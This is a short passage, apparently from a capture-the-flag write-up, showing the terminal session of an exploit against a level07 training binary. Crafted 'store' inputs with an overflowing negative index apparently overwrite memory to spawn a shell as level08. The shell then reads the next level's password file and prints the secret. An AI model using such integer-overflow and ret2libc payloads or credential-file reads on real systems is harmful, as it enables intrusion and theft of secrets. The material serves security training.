+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: -2147483534
+ Completed store command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
